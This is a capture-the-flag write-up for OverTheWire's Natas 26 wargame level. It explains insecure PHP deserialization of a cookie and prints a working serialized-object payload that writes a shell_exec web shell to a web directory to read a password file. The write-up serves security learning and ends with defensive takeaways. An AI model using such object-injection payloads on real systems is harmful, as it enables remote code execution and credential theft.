# 🧪 Natas 26

## 🎯 Objective
Obtain the password for **Natas 27**.

---

## 👀 Observation
- Website allows users to **draw lines on an image**.
- A cookie named `drawing` is used to store drawing data.
- Page source reveals that the cookie value is **unserialized using PHP**.
- User input is directly passed into `unserialize()` without validation.

---

## 🚨 Vulnerability
**Type:**  
- PHP Object Injection / Insecure deserialization

**Root Cause:**  
The application unserializes **user-controlled data** from cookie using `unserialize()` wihtout any integrity checks.
This allows an attacker to inject a **crafted PHP object** that executes arbitary code when magic methods are triggered.

---

## 🛠️ Exploitation Steps
1. Viewed the page source and identified the use of `unserialize()` on the `drawing` cookie.
2. Analyzed the PHP class responsible for handling drawing data.
3. Noted that the class contains a magic method that writes data to a file.
4. Crafted a malicious serialized object that writes PHP code to a file in the web directory.
5. URL-encoded the serialized payload.
6. Replaced the `drawing` cookie with the malicious payload.
7. Reloaded the page to trigger deserialization.
8. Accessed the created PHP file.
9. Executed the file to read the password for **Natas 27**.

---

## 💻 Key Payload / Command
**Malicious PHP code written to file**
```bash
class Logger{
    private $logFile;
    private $exitMsg;

    function __construct(){
        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_hello.php";
    }
}

$logger = new Logger();
echo base64_encode(serialize($logger));
```
**Password URL**
```bash
http://natas26.natas.labs.overthewire.org/img/natas26_hello.php
```

---

## 📖 Key Takeaways
- `unserialize()` on untrusted data is **extremely dangerous**.
- PHP object injection can lead directly to **remote code execution**.
- Magic methods (`__destruct`,`__wakeup`) are common attack vectors.
- Never deserialize user-controlled data without strict validation or signing.
  
---

## 🖼️ Screenshots 
<img width="1496" height="454" alt="image" src="https://github.com/user-attachments/assets/85fa36c6-2f4f-4116-a3e6-4ba824c32fa9" />
<img width="1030" height="467" alt="image" src="https://github.com/user-attachments/assets/3ccd8591-ab0c-4503-8314-47df0da57b08" /> <br>
 
*Password redacted for ethical reasons*
